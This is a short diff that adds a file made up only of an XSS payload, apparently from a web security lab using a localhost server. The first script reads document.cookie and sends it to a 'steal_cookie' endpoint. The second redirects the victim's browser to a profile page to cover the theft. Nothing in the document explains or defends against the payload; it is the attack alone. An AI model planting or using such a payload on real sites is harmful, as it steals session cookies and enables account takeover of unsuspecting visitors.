@@ -1,0 +1,7 @@
+<script>
+var request = new XMLHttpRequest();
+request.open('GET', 'http://localhost:3000/steal_cookie?cookie=' + document.cookie, false);
+request.send();
+</script><script>
+setTimeout(function() { window.location='http://localhost:3000/profile'; }, 300);
+</script>
